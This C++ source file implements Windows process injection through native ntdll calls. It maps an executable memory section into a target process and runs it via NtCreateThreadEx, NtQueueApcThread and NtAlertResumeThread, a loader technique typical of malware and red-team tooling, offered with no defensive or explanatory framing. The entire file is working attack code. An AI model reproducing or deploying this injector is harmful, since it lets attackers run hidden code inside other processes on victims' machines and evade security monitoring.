#include "Injector.h"

void Injector::MapLocalSection(HANDLE& sectionHandle, ntdll* nt, PVOID& localSectionAddress, SIZE_T size) {
	LARGE_INTEGER sectionSize = { size };
	// create a memory section
	nt->fNtCreateSection(&sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

	std::cout << "	[+] sectionHandle -> " << sectionHandle << std::endl;
	std::cout << "	[+] size -> " << size << std::endl;

	// create a view of the memory section in the local process
	nt->fNtMapViewOfSection(sectionHandle, GetCurrentProcess(), &localSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_READWRITE);

	std::cout << "	[+] localSectionAddress -> " << localSectionAddress << std::endl;
}

void Injector::MapRemoteSection(HANDLE& sectionHandle, HANDLE& targetHandle, ntdll* nt, PVOID& remoteSectionAddress, SIZE_T size) {
	nt->fNtMapViewOfSection(sectionHandle, targetHandle, &remoteSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_EXECUTE_READ);
	std::cout << "	[+] targetHandle -> " << targetHandle << std::endl;
	std::cout << "	[+] remoteSectionAddress -> " << remoteSectionAddress << std::endl;
}

void Injector::StartThread(HANDLE& targetHandle, PVOID& remoteSectionAddress, ntdll* nt) {
	HANDLE targetThreadHandle = NULL;
	nt->fNtCreateThreadEx(&targetThreadHandle, 0x1FFFFF, NULL, targetHandle, remoteSectionAddress, NULL, true, 0, 0xffff, 0xffff, NULL);
	std::cout << "	[+] NtCreateThreadEx" << std::endl;

	nt->fNtQueueApcThread(targetThreadHandle, remoteSectionAddress, 0, 0, 0);
	std::cout << "	[+] NtQueueApcThread" << std::endl;

	PULONG pSuspendLong = 0;
	nt->fNtAlertResumeThread(targetThreadHandle, pSuspendLong);
	std::cout << "	[+] NtAlertResumeThread" << std::endl;
}